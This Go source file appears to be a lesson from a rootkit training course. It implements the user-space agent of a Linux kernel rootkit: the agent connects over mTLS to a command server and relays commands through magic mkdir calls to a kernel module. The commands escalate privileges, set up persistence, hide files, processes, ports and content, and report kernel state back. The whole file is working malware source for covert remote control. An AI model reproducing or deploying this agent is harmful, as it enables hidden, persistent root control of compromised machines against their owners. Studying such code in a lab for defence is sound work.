// Agent mkdir bridge.
// Connect to the server over mTLS, read commands, translate each
// to a mkdir name, and issue os.Mkdir so the kernel module acts on it.
package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "agent: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	// mTLS setup (same as L15)
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caCert) {
		return fmt.Errorf("failed to parse CA cert")
	}
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		return fmt.Errorf("client keypair: %w", err)
	}
	cfg := &tls.Config{
		RootCAs:      pool,
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	var conn *tls.Conn
	for {
		conn, err = tls.Dial("tcp", serverAddr, cfg)
		if err == nil {
			break
		}
		time.Sleep(2 * time.Second)
	}
	defer conn.Close()

	fmt.Println("connected to", serverAddr)

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}
		if line == "INFO" {
			state, err := queryKernelState()
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
				continue
			}
			state = strings.ReplaceAll(state, "\n", " ")
			fmt.Fprintf(conn, "INFO %s\n", state)
			continue
		}
		name := translate(line)
		if name == "" {
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", line)
			continue
		}
		if err := os.Mkdir(name, 0); err != nil {
			fmt.Fprintf(conn, "ERR %v\n", err)
			continue
		}
		fmt.Fprintf(conn, "OK %s\n", name)
		fmt.Printf("exec: %s -> %s\n", line, name)
		if name == "rklings.quit" {
			break
		}
	}
	return scanner.Err()
}

func queryKernelState() (string, error) {
	buffer := make([]byte, 12288)
	copy(buffer, "rklings.info")
	length, _, errno := unix.Syscall(unix.SYS_MKDIR,
		uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
	runtime.KeepAlive(buffer)
	if errno != 0 {
		return "", errno
	}
	if length == 0 || length >= uintptr(len(buffer)) {
		return "", fmt.Errorf("invalid response length %d", length)
	}
	return strings.TrimSpace(string(buffer[:length])), nil
}

// translate converts a server command into the corresponding mkdir name
// that the kernel module's dispatcher recognizes.
func translate(line string) string {
	parts := strings.SplitN(line, " ", 3)
	switch parts[0] {
	case "PING":
		return "rklings.ping"
	case "STATUS":
		return "rklings.status"
	case "QUIT":
		return "rklings.quit"
	case "PERSIST":
		return "rklings.persist"
	case "UNPERSIST":
		return "rklings.unpersist"
	case "ESCALATE":
		if len(parts) >= 2 {
			return "rklings.e." + parts[1]
		}
		return "rklings.e"
	case "HIDE":
		if len(parts) < 3 {
			return ""
		}
		switch parts[1] {
		case "FILE":
			return "rklings.h.f." + parts[2]
		case "PID":
			return "rklings.h.i." + parts[2]
		case "PORT":
			return "rklings.h.p." + parts[2]
		case "CONTENT":
			return "rklings.h.c." + parts[2]
		}
	case "UNHIDE":
		if len(parts) < 3 {
			return ""
		}
		switch parts[1] {
		case "FILE":
			return "rklings.u.f." + parts[2]
		case "PID":
			return "rklings.u.i." + parts[2]
		case "PORT":
			return "rklings.u.p." + parts[2]
		case "CONTENT":
			return "rklings.u.c." + parts[2]
		}
	}
	return ""
}
